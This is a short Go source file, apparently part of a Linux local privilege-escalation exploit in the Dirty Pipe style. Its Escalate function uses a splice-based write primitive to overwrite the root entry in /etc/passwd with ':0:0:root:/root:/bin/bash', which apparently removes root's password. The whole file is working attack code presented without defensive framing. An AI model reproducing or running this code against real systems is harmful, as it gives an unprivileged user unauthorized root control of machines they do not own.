package splice

func Escalate(splice Splice) (err error) {
	offset, err := getRootPasswdOffset()
	if err != nil {
		return
	}
	payload := []byte(":0:0:root:/root:/bin/bash\n")
	err = splice.Write("/etc/passwd", int64(offset), payload)
	if err != nil {
		return
	}
	return
}
